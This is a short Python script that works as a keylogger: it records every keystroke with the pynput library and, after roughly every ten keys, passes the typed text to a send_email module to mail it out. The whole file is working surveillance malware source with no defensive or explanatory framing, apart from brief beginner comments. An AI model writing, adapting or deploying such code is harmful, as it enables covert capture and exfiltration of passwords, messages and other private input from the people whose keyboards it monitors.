import pynput
from pynput.keyboard import Key, Listener
import send_email

count = 0
keys = []

def on_press(key):
    print(key, end= " ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:##Setting char limit to 10 charactors
        count = 0
        email(keys)

def email(keys):##it takes all the keys 
    message = ""
    for key in keys:
        k = key.replace("'","")##Key presses are seprated b this ' so we are replacing it to make it readable
        if key == "Key.space":#Replacing space and putting space
            k = " " 
        elif key.find("Key")>0:
            k = ""
        message += k
    print(message)
    send_email.sendEmail(message)


def on_release(key):
    if key == Key.esc:##If esc key is pressed it will close the program
        return False








with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()